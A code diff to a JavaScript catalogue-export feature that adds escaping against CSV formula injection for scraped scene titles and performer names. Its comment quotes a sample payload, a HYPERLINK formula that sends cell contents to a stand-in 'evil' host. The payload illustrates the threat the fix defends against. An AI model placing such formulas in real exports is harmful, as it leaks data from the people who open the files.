@@ -136,10 +136,22 @@ async function pollUntilIdle() {
   try { await load(); } catch { /* keep polling */ }
   if (refreshing) setTimeout(pollUntilIdle, 4000);
 }
+// Every exported cell is REMOTE TEXT: titles, performer names and labels come
+// from scraped studio pages, and a title is attacker-influenced in the same way
+// any user-supplied string is. Quoting alone does not make a CSV safe - Excel,
+// LibreOffice and Google Sheets all evaluate a quoted cell that STARTS with
+// `=`, `+`, `-` or `@` as a formula, so `=HYPERLINK("http://evil/"&A1,"click")`
+// in a title becomes live code in whoever opens the export. The leading
+// apostrophe is the documented escape: it forces text and is not displayed.
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+function csvCell(value) {
+  const text = String(value ?? "");
+  return `"${(FORMULA_LEAD.test(text) ? `'${text}` : text).replaceAll('"', '""')}"`;
+}
 $("#export").addEventListener("click", () => {
   const headings = ["studio", "title", "release_date", "performers", "release_url", "video_sources"];
   const rows = scenes.map((scene) => [scene.label, scene.title, scene.releaseDate, (scene.performers || []).join("; "), scene.releaseUrl, linksFor(scene).map((item) => item.url).join("; ")]);
-  const csv = [headings, ...rows].map((row) => row.map((cell) => `"${String(cell ?? "").replaceAll('"', '""')}"`).join(",")).join("\r\n");
+  const csv = [headings, ...rows].map((row) => row.map(csvCell).join(",")).join("\r\n");
   const anchor = document.createElement("a");
   anchor.href = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
   anchor.download = "liszt-catalogue.csv";
